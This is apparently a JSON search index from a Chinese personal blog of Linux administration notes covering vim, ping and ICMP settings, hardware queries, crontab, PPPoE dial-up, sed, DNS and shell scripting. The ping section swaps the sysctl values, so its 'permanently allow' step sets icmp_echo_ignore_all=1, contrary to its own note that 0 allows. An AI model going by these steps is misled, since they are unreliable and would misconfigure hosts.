生成，而不是直接键入 ^M 去掉重复行1234:sort //直接排序:g/^\\(.*\\)$\\n\\1$/d //去除重复行:g/\\%(^\\1$\\n\\)\\@&lt;=\\(.*\\)$/d //功能同上，也是去除重复行:g/\\%(^\\1\\&gt;.*$\\n\\)\\@&lt;=\\(\\k\\+\\).*$/d //功能同上，也是去除重复行 非可见字符1:set invlist 通过:help digraph-table 可看到所有Vim中可输入的特殊字符： 123456789101112131415char digraph hex dec official name^@ NU 0x00 0 NULL (NUL)^A SH 0x01 1 START OF HEADING (SOH)^B SX 0x02 2 START OF TEXT (STX)^C EX 0x03 3 END OF TEXT (ETX)^D ET 0x04 4 END OF TRANSMISSION (EOT)^E EQ 0x05 5 ENQUIRY (ENQ)^F AK 0x06 6 ACKNOWLEDGE (ACK)^G BL 0x07 7 BELL (BEL)^H BS 0x08 8 BACKSPACE (BS)^I HT 0x09 9 CHARACTER TABULATION (HT)^@ LF 0x0a 10 LINE FEED (LF)^K VT 0x0b 11 LINE TABULATION (VT)^L FF 0x0c 12 FORM FEED (FF)^M CR 0x0d 13 CARRIAGE RETURN (CR) 如何打出非可见字符 需要先按下前导键，例如在编辑模式下输入 123456&lt;Ctrl-K&gt;HT就会得到非可见字符 其中HT就是通过`:help digraph-table`查出的digraph 参考 切换窗口12CTRL-W j 光标切换到下一个窗口CTRL-W k 光标切换到上一个窗口 删除当前单词1daw 查找查找当前单词在 normal 模式下按下 * 即可查找光标所在单词（word）， 要求每次出现的前后为空白字符或标点符号。 例如当前为 foo， 可以匹配 foo bar 中的 foo，但不可匹配 foobar 中的 foo。 按下 g* 即可查找光标所在单词的字符序列，每次出现前后字符无要求。 即 foo bar 和 foobar 中的 foo 均可被匹配到。 大小写敏感查找在查找模式中加入 \\c 表示大小写不敏感查找，\\C 表示大小写敏感查找。例如： &#x2F;foo\\c","categories":[{"name":"文本","slug":"文本","permalink":"http://example.com/categories/%E6%96%87%E6%9C%AC/"}],"tags":[{"name":"vim","slug":"vim","permalink":"http://example.com/tags/vim/"}]},{"title":"ping 的使用方法","slug":"Ping的使用方法","date":"2021-04-21T16:00:00.000Z","updated":"2021-10-21T10:05:18.000Z","comments":true,"path":"2021/04/22/Ping的使用方法/","permalink":"http://example.com/2021/04/22/Ping%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/","excerpt":"","text":"常见用法1234567ping -i 0.2 -c 30 -I 192.168.10.208 180.149.132.47 -q-i 指定发送数据包时间间隔 -c 指定一共发送多少个数据包 -q指定直接显示程序的启动和最后结果-I 网络界面：使用指定的网络界面送出数据包，即192.168.10.208是发出ping命令的主机IP地址，180.149.132.47是被ping的主机的IP地址 -w 等待指定时间后停止ping程序的执行。当试图测试不可达主机时此选项很有用，时间单位是秒。 linux禁止Ping与开启Ping的方法Linux默认是允许Ping响应的，系统是否允许Ping由2个因素决定的：A、内核参数，B、防火墙，需要2个因素同时允许才能允许Ping，2个因素有任意一个禁Ping就无法Ping。 当linux禁止Ping后，可通过tcping.exe指定端口ping通该机器 内核参数设置 允许Ping设置 临时允许Ping操作的命令为：#echo 0 &gt;&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;icmp_echo_ignore_all 永久允许Ping配置方法。 1234567/etc/sysctl.conf 中增加一行net.ipv4.icmp_echo_ignore_all=1如果已经有net.ipv4.icmp_echo_ignore_all这一行了，直接修改=号后面的值即可的（0表示允许，1表示禁止）修改完成后执行sysctl -p使新配置生效 禁止Ping设置 临时禁止Ping的命令为：#echo 1 &gt;&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;icmp_echo_ignore_all 永久允许Ping配置方法1234567/etc/sysctl.conf 中增加一行net.ipv4.icmp_echo_ignore_all=0如果已经有net.ipv4.icmp_echo_ignore_all这一行了，直接修改=号后面的值即可的。（0表示允许，1表示禁止）修改完成后执行sysctl -p使新配置生效。 防火墙设置注：此处的方法的前提是内核配置是默认值，也就是没有禁止Ping 这里以Iptables防火墙为例，其他防火墙操作方法可参考防火墙的官方文档。 允许Ping设置 1234567iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPTiptables -A OUTPUT -p icmp --icmp-type echo-reply -j ACCEPT或者也可以临时停止防火墙操作的。service iptables stop 禁止Ping设置 1iptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROP 参考链接:Linux禁止ping以及开启ping的方法","categories":[{"name":"linux网络","slug":"linux网络","permalink":"http://example.com/categories/linux%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"常识","slug":"常识","permalink":"http://example.com/tags/%E5%B8%B8%E8%AF%86/"},{"name":"技巧","slug":"技巧","permalink":"http://example.com/tags/%E6%8A%80%E5%B7%A7/"}]},{"title":"linux查看服务器的型号","slug":"linux查看服务器的型号","date":"2021-04-21T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/04/22/linux查看服务器的型号/","permalink":"http://example.com/2021/04/22/linux%E6%9F%A5%E7%9C%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%9E%8B%E5%8F%B7/","excerpt":"","text":"查询服务器的型号 123dmidecode -t 1或者是dmidecode |grep &quot;Product Name&quot; 查询主板信息 1dmidecode -t 2 查看cpu型号 1cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c 查看cpu物理数 1cat /proc/cpuinfo |grep &quot;physical id&quot; | sort | uniq | wc -l 查看单个cpu核数 1cat /proc/cpuinfo| grep &quot;cpu cores&quot;| uniq 查看cpu逻辑数 1cat /proc/cpuinfo| grep &quot;processor&quot;| wc -l 查看内存型号 1dmidecode -t 17 查看内存插槽数和当前内存数 1dmidecode|grep -P -A5 &quot;Memory Device&quot; |grep Size 大部分服务器都配置了阵列卡，对硬盘做了raid，可以通过MegaCli这个工具进行命令查询阵列卡及硬盘信息（安装包见附件） 1234567891011MegaCli64 -cfgdsply -aALLRAID型号对应表信息如下：RAID Level : Primary-1, Secondary-0, RAID Level Qualifier-0&quot; #代表Raid 1RAID Level : Primary-0, Secondary-0, RAID Level Qualifier-0&quot; #代表Raid 0RAID Level : Primary-5, Secondary-0, RAID Level Qualifier-3&quot; #代表Raid 5RAID Level : Primary-1, Secondary-3, RAID Level Qualifier-0&quot; #代表Raid10","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"硬件信息","slug":"硬件信息","permalink":"http://example.com/tags/%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF/"}]},{"title":"路由规则ip rule","slug":"路由规则ip-rule","date":"2021-04-15T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/04/16/路由规则ip-rule/","permalink":"http://example.com/2021/04/16/%E8%B7%AF%E7%94%B1%E8%A7%84%E5%88%99ip-rule/","excerpt":"","text":"ip rule列出路由规则 1234560: from all lookup local 200: from 58.23.181.229 lookup ppp2 320: from 193.233.7.83 lookup inr.ruhep map-to 192.203.80.14432765: from 192.168.1.38 lookup mgt 32766: from all lookup main 32767: from all lookup default 每行第一部分的数字是规则的优先级，接着是选择符。lookup后面接着路由表识别符。如果规则要进行网络地址转换，还需要一个关键词map-to设置转换以后的地址。","categories":[{"name":"linux网络","slug":"linux网络","permalink":"http://example.com/categories/linux%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"技巧","slug":"技巧","permalink":"http://example.com/tags/%E6%8A%80%E5%B7%A7/"}]},{"title":"shell脚本问题","slug":"shell脚本问题","date":"2021-04-14T16:00:00.000Z","updated":"2021-10-15T09:12:24.000Z","comments":true,"path":"2021/04/15/shell脚本问题/","permalink":"http://example.com/2021/04/15/shell%E8%84%9A%E6%9C%AC%E9%97%AE%E9%A2%98/","excerpt":"","text":"ifif始终只是判断程序执行结果的exit status，即$?，0表示true，非0表示false。 1[ -d /root/test ]等同于test -d /root/test shell 中的条件判断 “并且” “或者”并且，and 1234567if [ c1 -a c2 ]; thenfiif [ c1 ] &amp;&amp; [ c2 ]; thenfi 或者，or 1234567if [ c1 -o c2 ]; thenfiif [ c1 -o c2 ]; thenfi 加减123let a=$s+1$(($s+1)) 定时任务中脚本不能执行123456手动执行脚本可以运行，但在crontab里面不行的解决方法source /etc/profile. ~/.bash_profile#!/bin/bash##执行shell脚本的命令","categories":[{"name":"shell","slug":"shell","permalink":"http://example.com/categories/shell/"}],"tags":[{"name":"shell","slug":"shell","permalink":"http://example.com/tags/shell/"}]},{"title":"clarias提取记录","slug":"clarias","date":"2021-04-12T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/04/13/clarias/","permalink":"http://example.com/2021/04/13/clarias/","excerpt":"","text":"注释：明天记得把图片合成一下（局部的和整体的）","categories":[{"name":"galgame","slug":"galgame","permalink":"http://example.com/categories/galgame/"}],"tags":[{"name":"提取","slug":"提取","permalink":"http://example.com/tags/%E6%8F%90%E5%8F%96/"}]},{"title":"关于 /etc/crontab 及 /var/spool/cron/$USER 中定义定时任务","slug":"linux上的定时任务","date":"2021-03-30T16:00:00.000Z","updated":"2022-09-05T02:15:10.000Z","comments":true,"path":"2021/03/31/linux上的定时任务/","permalink":"http://example.com/2021/03/31/linux%E4%B8%8A%E7%9A%84%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/","excerpt":"","text":"简介定时任务在linux上主要体现在两个地方，一个是/etc/crontab ,另一个就是定义了任务计划的用户/var/spool/cron/$USER /etc/crontab只有root用户可以使用，使用时需root权限，而且必须指定运行用户，才会执行*/1 * * * * * root /usr/sbin/ntpdate s1a.time.edu.cn &amp;&gt; /dev/null /var/spool/cron/$USER所有用户都可以使用，可以使用crontab -u username -e命令来直接编辑这个文件。（相当于直接vi 这个文件）*/1 * * * * * /usr/sbin/ntpdate s1a.time.edu.cn &amp;&gt; /dev/null * * * * *分 时 天 月 周 特殊符号&#x2F; 每- 连续时间* 所有匹配 定时任务脚本不执行定时任务没写错的话，那估计是脚本里没用【全局命令】（命令路径写全） 解决方法： 用【全局命令】 使用如下方法12&quot;30 * * * * su - root -c &#x27;/var/xxx.sh&#x27;chmod +x /var/xxx.sh&#x27; crontab定时任务不执行的原因","categories":[{"name":"Linux定时任务","slug":"Linux定时任务","permalink":"http://example.com/categories/Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/"}],"tags":[{"name":"常识","slug":"常识","permalink":"http://example.com/tags/%E5%B8%B8%E8%AF%86/"}]},{"title":"linux中/etc/rc.local脚本的作用","slug":"linux开机自执行脚本","date":"2021-03-30T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/03/31/linux开机自执行脚本/","permalink":"http://example.com/2021/03/31/linux%E5%BC%80%E6%9C%BA%E8%87%AA%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC/","excerpt":"","text":"linux会在开机之后自动source执行&#x2F;etc&#x2F;rc.local脚本","categories":[{"name":"shell","slug":"shell","permalink":"http://example.com/categories/shell/"}],"tags":[{"name":"常识","slug":"常识","permalink":"http://example.com/tags/%E5%B8%B8%E8%AF%86/"}]},{"title":"服务器拨号注意事项","slug":"服务器拨号注意事项","date":"2021-03-28T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/03/29/服务器拨号注意事项/","permalink":"http://example.com/2021/03/29/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8B%A8%E5%8F%B7%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/","excerpt":"","text":"服务器拨号是由账号密码播成的，拨号服务查看/opt/pppoe/pppoe_user.txt文件然后生成配置文件/etc/ppp/chap-secrets和/etc/ppp/pap-secrets（这是拨号服务真正访问的配置文件），还有网卡 在/opt/pppoe目录下有拨号测试脚本可以使用（当拨号失败时）拨号到最后要创建网卡，也就是ifcfg-ppp0文件， 当拨号失败的时候，也就是某一个账户无效时，比如第二个账户无效，拨不上号，拨号服务就会将ifcfg-ppp1创建一个备份ifcfg-ppp1.bak，然后将ifcfg-ppp1删除。这样下次拨号就不会再拨这个号了 更改服务器拨号需要更改的文件 pppoe_user.txt chap-secrets pap-secrets ifcfg-ppp 网卡记录拨号的账号 1234567891011121314151617181920212223242526# cat /etc/sysconfig/network-scripts/ifcfg-ppp12USERCTL=yesBOOTPROTO=dialupNAME=DSLppp12DEVICE=ppp12TYPE=xDSLONBOOT=noPIDFILE=/var/run/pppoe-adsl12.pidFIREWALL=NONEPING=.PPPOE_TIMEOUT=80LCP_FAILURE=3LCP_INTERVAL=20CLAMPMSS=1412CONNECT_POLL=6CONNECT_TIMEOUT=60DEFROUTE=noSYNCHRONOUS=noETH=macv12PROVIDER=DSLppp12USER=11111111PEERDNS=noDEMAND=noLINUX_PLUGIN=/usr/lib64/pppd/2.4.5/rp-pppoe.so 检测拨号是否成功 12345config_list=`ls /etc/sysconfig/network-scripts/ifcfg-ppp*|sort -Vk 1`for config in $config_listdo /usr/sbin/pppoe-status $configdone 检测汇聚是否成功1.进行带宽测速2.查看iptables规则iptables -nvL -t mangle input规则 output规则 postrouting规则 判断机器是否为专线 网卡配置为静态IP，为公网IP nat类型为open 服务拨号时会清除路由，这时候添加默认路由是加不上去的解决方法把进程里的拨号进程清掉（注意：进程号是不断变换的）ps aux |grep pppkill -9 $进程号把进程杀掉之后就能添加路由了ip route add default via 182.100.208.1(网关) dev eth0 proto dhcp metric 100dhcp： 动态分配IPstatic: 静态IP","categories":[{"name":"服务器容器","slug":"服务器容器","permalink":"http://example.com/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/"}],"tags":[{"name":"技巧","slug":"技巧","permalink":"http://example.com/tags/%E6%8A%80%E5%B7%A7/"}]},{"title":"sed命令","slug":"sed插入字符串","date":"2021-03-18T16:00:00.000Z","updated":"2022-07-27T08:07:36.000Z","comments":true,"path":"2021/03/19/sed插入字符串/","permalink":"http://example.com/2021/03/19/sed%E6%8F%92%E5%85%A5%E5%AD%97%E7%AC%A6%E4%B8%B2/","excerpt":"","text":"在指定行前后插入一行12345678sed -i &#x27;$行数i 字符串&#x27; 文件-i 直接修改文件(如果指定扩展名就备份文件)**在第一行前插入文本** sed -i &#x27;1i ttt&#x27; a.txt**在第一行后插入文本** sed -i &#x27;1a ttt&#x27; a.txt 在指定的多行前后插入1234567sed -i &#x27;$行数,$行数i 字符串&#x27; 文件在指定的多行前面插入sed -i &#x27;n,mi ttt&#x27; a.txt在指定的多行后面插入sed -i &#x27;n,ma ttt&#x27; a.txt 删除指定行1234sed -i 2d a.txt删除模板的第一行sed -i D a.txt 替换12345678把文件filename中的a字符换成A字符sed -i &quot;s/a/A/g&quot; filename批量替换 替换dir文件夹下所有文件中的a字符变成A字符sed -i &quot;s/a/A/g&quot; `grep a -rl dir/`替换为空格 将tab替换为空格sed -i &quot;s/\\t/ /g&quot; filename 查找1sed -n &#x27;/^PermitRootLogin yes/&#x27;p /etc/ssh/sshd_config 删除1sed -i &#x27;/PermitRootLogin yes/d&#x27; /etc/ssh/sshd_config 查找某个字符然后替换其他1sed -i &#x27;/sshd:all/s/sshd/#sshd/g&#x27; /etc/hosts.deny 查找某行容纳后替换该行的字符1sed -i &#x27;&#x27;$lostlinenum&#x27;s/$/ 数据丢失/&#x27; /tmp/purebd M-BM- 字符问题1sed -i &#x27;s/\\xc2\\xa0/ /g&#x27; 查找文件中某一行内容12345查找文件text中第三行的内容sed -n &#x27;3p&#x27; text查找文件text中第二行到第四行的内容命令： sed -n &#x27;2,4p&#x27; text 提取文本最后一行123sed -n &#x27;$p&#x27;sed &#x27;$!N;$!D&#x27; sed -i默认不检查软链接！！！sed的-i &#x2F; –in-place参数可以直接修改文件。但是，默认情况下，sed在读取文件之前不会检查文件是否是软链接，所以sed转换之后覆盖原文件（sed相当于将原文件通过流方式过滤改成，然后通过管道生成临时文件，然后删除掉原文件，再将临时文件重命名成原文件）。这就导致了如果原文件是一个软链接，就会在修改后转变成实体文件。 GNU sed 提供了一个–follow-symlinks参数，可以检测修改的是软链接，而实现对软链接指向的实体文件的修改，避免破坏软链接。案例如下： 1sed -i --follow-symlinks &#x27;s/cat/dog/&#x27; /etc/rc.local 参考：如何避免sed -i破坏文件的软链接","categories":[{"name":"文本","slug":"文本","permalink":"http://example.com/categories/%E6%96%87%E6%9C%AC/"}],"tags":[{"name":"sed","slug":"sed","permalink":"http://example.com/tags/sed/"}]},{"title":"DNS Resolv 设置和重启无效的解决方法","slug":"DNS-Resolv设置和重启无效","date":"2021-03-17T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/03/18/DNS-Resolv设置和重启无效/","permalink":"http://example.com/2021/03/18/DNS-Resolv%E8%AE%BE%E7%BD%AE%E5%92%8C%E9%87%8D%E5%90%AF%E6%97%A0%E6%95%88/","excerpt":"","text":"如何判断DNS无法正常工作？ 12345# ping www.baidu.com #ping不通# ping 8.8.8.8 #可以ping通查看丢包率是多少，太大的话DNS可能处于无法正常工作的状态了","categories":[{"name":"linux网络","slug":"linux网络","permalink":"http://example.com/categories/linux%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"常识","slug":"常识","permalink":"http://example.com/tags/%E5%B8%B8%E8%AF%86/"},{"name":"DNS","slug":"DNS","permalink":"http://example.com/tags/DNS/"}]},{"title":"linux刷新dns服务器","slug":"linux刷新dns服务器","date":"2021-03-17T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/03/18/linux刷新dns服务器/","permalink":"http://example.com/2021/03/18/linux%E5%88%B7%E6%96%B0dns%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"","text":"刷新 DNS 缓存需要重起 nscd daemon： 要重起 nscd daemon，在终端输入/etc/rc.d/init.d/nscd restart命令执行完毕，你的DNS缓存就被刷新了。 如果是比较新的Linux版本，你可能需要使用下面的命令：/etc/init.d/nscd restart 或者也许你的系统使用的是 systemd 来管理服务，那就使用命令：sudo systemctl restart nscd 当然也有可能系统使用的不是 nscd 而是 systemd-resolve，那就使用命令：sudo systemd-resolve --flush-caches 少数情况下，还有的系统使用了 dnsmasq 或者 named，那就使用命令： 123sudo systemctl restart dnsmasq或者：sudo systemctl restart named","categories":[{"name":"linux网络","slug":"linux网络","permalink":"http://example.com/categories/linux%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"常识","slug":"常识","permalink":"http://example.com/tags/%E5%B8%B8%E8%AF%86/"},{"name":"DNS","slug":"DNS","permalink":"http://example.com/tags/DNS/"}]},{"title":"shell脚本常识","slug":"shell脚本常识","date":"2021-03-16T16:00:00.000Z","updated":"2022-09-05T02:32:46.000Z","comments":true,"path":"2021/03/17/shell脚本常识/","permalink":"http://example.com/2021/03/17/shell%E8%84%9A%E6%9C%AC%E5%B8%B8%E8%AF%86/","excerpt":"","text":"比较运算符 文件比较运算符 运算符 描述 示例 -e filename 如果 filename 存在，则为真 [ -e &#x2F;var&#x2F;log&#x2F;syslog ] -d filename 如果 filename 为目录，则为真 [ -d &#x2F;tmp&#x2F;mydir ] -f filename 如果 filename 为常规文件，则为真 -f &#x2F;usr&#x2F;bin&#x2F;grep ] -L filename 如果 filename 为符号链接，则为真 [ -L &#x2F;usr&#x2F;bin&#x2F;grep ] -r filename 如果 filename 可读，则为真 [ -r &#x2F;var&#x2F;log&#x2F;syslog ] -w filename 如果 filename 可写，则为真 [ -w &#x2F;var&#x2F;mytmp.txt ] -x filename 如果 filename 可执行，则为真 [ -L &#x2F;usr&#x2F;bin&#x2F;grep ] -s filename 如果文件存在且至少有一个字符则为真 -c filename 如果文件存在且为字符型特殊文件则为真 -b filename 如果文件存在且为块特殊文件则为真 filename1 -nt filename2 如果 filename1 比 filename2 新，则为真 [ &#x2F;tmp&#x2F;install&#x2F;etc&#x2F;services -nt &#x2F;etc&#x2F;services ] filename1 -ot filename2 如果 filename1 比 filename2 旧，则为真 [ &#x2F;boot&#x2F;bzImage -ot arch&#x2F;i386&#x2F;boot&#x2F;bzImage ] 字符串比较运算符 （请注意引号的使用，这是防止空格扰乱代码的好方法 运算符 描述 示例 -z string 如果 string 长度为零，则为真 [ -z “$myvar” ] -n string 如果 string 长度非零，则为真 [ -n “$myvar” ] string1 &#x3D; string2 如果 string1 与 string2 相同，则为真 [ “$myvar” &#x3D; “one two three” ] string1 !&#x3D; string2 如果 string1 与 string2 不同，则为真 [ “$myvar” !&#x3D; “one two three” ] 算术比较运算符 运算符 描述 示例 num1 -eq num2 等于 [ 3 -eq $mynum ] num1 -ne num2 不等于 [ 3 -ne $mynum ] num1 -lt num2 小于 [ 3 -lt $mynum ] num1 -le num2 小于或等于 [ 3 -le $mynum ] num1 -gt num2 大于 [ 3 -gt $mynum ] num1 -ge num2 大于或等于 [ 3 -ge $mynum ] shell里面的赋值方法有两种，格式为 arg&#x3D;&#96;(命令) arg&#x3D;$(命令) 如果想要把某一文件的总行数赋值给变量nlines，可以表达为 123nlines=`(awk &#x27;END&#123;print NR&#125;&#x27; filename)`或者nlines=$(awk &#x27;END&#123;print NR&#125;&#x27; filename) shell判断文件是否存在1234567891011121314151617181920212223242526272829303132331. shell判断文件,目录是否存在或者具有权限2. #!/bin/sh3.4. myPath=&quot;/var/log/httpd/&quot;5. myFile=&quot;/var /log/httpd/access.log&quot;6.7. # 这里的-x 参数判断$myPath是否存在并且是否具有可执行权限8. if [ ! -x &quot;$myPath&quot;]; then9. mkdir &quot;$myPath&quot;10. fi11.12. # 这里的-d 参数判断$myPath是否存在13. if [ ! -d &quot;$myPath&quot;]; then14. mkdir &quot;$myPath&quot;15. fi16.17. # 这里的-f参数判断$myFile是否存在18. if [ ! -f &quot;$myFile&quot; ]; then19. touch &quot;$myFile&quot;20. fi21.22. # 其他参数还有-n,-n是判断一个变量是否是否有值23. if [ ! -n &quot;$myVar&quot; ]; then24. echo &quot;$myVar is empty&quot;25. exit 026. fi27.28. # 两个变量判断是否相等29. if [ &quot;$var1&quot; = &quot;$var2&quot; ]; then30. echo &#x27;$var1 eq $var2&#x27;31. else32. echo &#x27;$var1 not eq $var2&#x27;33. fi 123456789101112131415161718192021222324252627-f 和-e的区别Conditional Logic on Files-a file exists.-b file exists and is a block special file.-c file exists and is a character special file.-d file exists and is a directory.-e file exists (just the same as -a).-f file exists and is a regular file.-g file exists and has its setgid(2) bit set.-G file exists and has the same group ID as this process.-k file exists and has its sticky bit set.-L file exists and is a symbolic link.-n string length is not zero.-o Named option is set on.-O file exists and is owned by the user ID of this process.-p file exists and is a first in, first out (FIFO) special file ornamed pipe.-r file exists and is readable by the current process.-s file exists and has a size greater than zero.-S file exists and is a socket.-t file descriptor number fildes is open and associated with aterminal device.-u file exists and has its setuid(2) bit set.-w file exists and is writable by the current process.-x file exists and is executable by the current process.-z string length is zero. shell 脚本中$$,$#,$？分别代表什么意思？123456789101112$0 这个程式的执行名字$n 这个程式的第n个参数值，n=1..9$* 这个程式的所有参数,此选项参数可超过9个。$# 这个程式的参数个数$$ 这个程式的PID(脚本运行的当前进程ID号)$! 执行上一个背景指令的PID(后台运行的最后一个进程的进程ID号)$? 执行上一个指令的返回值 (显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误)$- 显示shell使用的当前选项，与set命令功能相同$@ 跟$*类似，但是可以当作数组用sh -x 显示执行该脚本执行所有变量的值sh -n 返回所有语法错误信息 shell 脚本中$$,$#,$?分别代表什么意思? shell中设置文字输出的颜色及字体格式123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#下面是字体输出颜色及终端格式控制 #字体色范围：30-37 echo -e &quot;\\033[30m 黑色字 \\033[0m&quot; echo -e &quot;\\033[31m 红色字 \\033[0m&quot; echo -e &quot;\\033[32m 绿色字 \\033[0m&quot; echo -e &quot;\\033[33m ×××字 \\033[0m&quot; echo -e &quot;\\033[34m 蓝色字 \\033[0m&quot; echo -e &quot;\\033[35m 紫色字 \\033[0m&quot; echo -e &quot;\\033[36m 天蓝字 \\033[0m&quot; echo -e &quot;\\033[37m 白色字 \\033[0m&quot; #字背景颜色范围：40-47 echo -e &quot;\\033[40;37m 黑底白字 \\033[0m&quot; echo -e &quot;\\033[41;30m 红底黑字 \\033[0m&quot; echo -e &quot;\\033[42;34m 绿底蓝字 \\033[0m&quot; echo -e &quot;\\033[43;34m 黄底蓝字 \\033[0m&quot; echo -e &quot;\\033[44;30m 蓝底黑字 \\033[0m&quot; echo -e &quot;\\033[45;30m 紫底黑字 \\033[0m&quot; echo -e &quot;\\033[46;30m 天蓝底黑字 \\033[0m&quot; echo -e &quot;\\033[47;34m 白底蓝字 \\033[0m&quot; #控制选项说明 #\\033[0m 关闭所有属性 #\\033[1m 设置高亮度 #\\033[4m 下划线 echo -e &quot;\\033[4;31m 下划线红字 \\033[0m&quot; #闪烁 echo -e &quot;\\033[5;34m 红字在闪烁 \\033[0m&quot; #反影 echo -e &quot;\\033[8m 消隐 \\033[0m &quot; #\\033[30m-\\033[37m 设置前景色 #\\033[40m-\\033[47m 设置背景色 #\\033[nA光标上移n行 #\\033[nB光标下移n行 echo -e &quot;\\033[4A 光标上移4行 \\033[0m&quot; #\\033[nC光标右移n行 #\\033[nD光标左移n行 #\\033[y;xH设置光标位置 #\\033[2J清屏 #\\033[K清除从光标到行尾的内容 echo -e &quot;\\033[K 清除光标到行尾的内容 \\033[0m&quot; #\\033[s 保存光标位置 #\\033[u 恢复光标位置 #\\033[?25| 隐藏光标 #\\033[?25h 显示光标 echo -e &quot;\\033[?25l 隐藏光标 \\033[0m&quot; echo -e &quot;\\033[?25h 显示光标 \\033[0m&quot; shell中设置文字输出的颜色及字体格式 判断输入参数的个数（命令行）123456789101112if [ $# != 3 ] ; thenecho &quot;USAGE: $0 from to&quot;echo &quot; e.g.: $0 ~/oucaijun/from ~/oucaijun/to&quot;exit 1;fi————————————————————————$#代表了命令行的参数数量位置参数 $1， $2,..., $N，$#代表了命令行的参数数量， $0代表了脚本的名字-ne 不等于 linux脚本：shell, 判断输入参数的个数（命令行） 软连接1ln -s 源文件 目标文件 linux 创建连接命令 ln -s 软链接 ossecOSSEC安装","categories":[{"name":"shell","slug":"shell","permalink":"http://example.com/categories/shell/"}],"tags":[{"name":"常识","slug":"常识","permalink":"http://example.com/tags/%E5%B8%B8%E8%AF%86/"}]},{"title":"正则表达式元字符集","slug":"正则表达式元字符集","date":"2021-03-15T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/03/16/正则表达式元字符集/","permalink":"http://example.com/2021/03/16/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%83%E5%AD%97%E7%AC%A6%E9%9B%86/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657^匹配行的开始 如：&#x27;^grep&#x27;匹配所有以grep开头的行。 $匹配行的结束 如：&#x27;grep$&#x27;匹配所有以grep结尾的行。 .匹配一个非换行符的字符 如：&#x27;gr.p&#x27;匹配gr后接一个任意字符，然后是p。 *匹配零个或多个先前字符 如：&#x27;*grep&#x27;匹配所有一个或多个空格后紧跟grep的行。 .*一起用代表任意字符。 []匹配一个指定范围内的字符，如&#x27;[Gg]rep&#x27;匹配Grep和grep。即[mn]表示匹配m或者n关键字符，相当于grep -E &quot;m|n&quot;。注意[]里面不要放太多关键字符，容易混乱！只要放[]里面的都是要匹配的关键字符！ [^]匹配一个不在指定范围内的字符，如：&#x27;[^A-FH-Z]rep&#x27;匹配不包含A-F和H-Z的一个字母，但是包含rep并且rep不在开头（即*req）的行。 \\(..\\)标记匹配字符，如&#x27;\\(love\\)&#x27;，love被标记为1。 \\&lt;匹配单词的开始，如:&#x27;\\ \\&gt;匹配单词的结束，如&#x27;str\\&gt;&#x27;匹配包含以str结尾的单词的行。通常使用&quot;\\&lt;关键字符\\&gt;&quot;作为精准匹配，相当于grep -w x\\&#123;m\\&#125;重复字符x，m次，如：&#x27;o\\&#123;5\\&#125;&#x27;匹配包含5个o的行。 x\\&#123;m,\\&#125;重复字符x,至少m次，如：&#x27;o\\&#123;5,\\&#125;&#x27;匹配至少有5个o的行。 x\\&#123;m,n\\&#125;重复字符x，至少m次，不多于n次，如：&#x27;o\\&#123;5,10\\&#125;&#x27;匹配5--10个o的行。 \\w匹配文字和数字字符，也就是[A-Za-z0-9]，如：&#x27;G\\w*p&#x27;匹配以G后跟零个或多个文字或数字字符，然后是p。 \\W\\w的反置形式，匹配一个或多个非单词字符，如点号句号等。 \\b单词锁定符，如: \\byang\\b 表示只匹配yang。相当于grep -w &quot;yang&quot; 或者 grep &quot;\\&lt;yang\\&gt;&quot; +匹配一个或多个先前的字符。如：&#x27;[a-z]+able&#x27;，匹配一个或多个小写字母后跟able的串，如loveable,enable,disable等。注意：先前字符必须使用()或[]括起来，并且使用grep -E。 ?匹配零个或一个先前的字符。如：&#x27;(gr)?p&#x27;匹配gr后跟一个或没有字符，然后是p的行。注意：先前字符必须使用()或[]括起来，并且使用grep -E。 a|b|c匹配a或b或c。如grep -E &quot;a|b|c&quot;, 匹配a或b或c中的任意一个都可以。grep -v &quot;a\\|b\\|c&quot; 或 egrep -v &quot;a|b|c&quot; 过滤掉a或b或c中的任意一个进行搜索。 ()分组符号，如：love(able|rs)ov+匹配loveable或lovers，匹配一个或多个ov。 正则表达式字符串匹配1teststr = &quot;wwcdcaon111sdsda\\nw\\ncwckjkkkk\\npppphellowordcc!&quot; ‘.’ 匹配\\n(换行符)以外的任何字符 1234pattern = re.compile(r&#x27;w.c&#x27;)print pattern.findall(teststr)[&#x27;wwc&#x27;] ‘*’ 前面字符出现0次以及以上 1234pattern = re.compile(r&#x27;w*c&#x27;)print 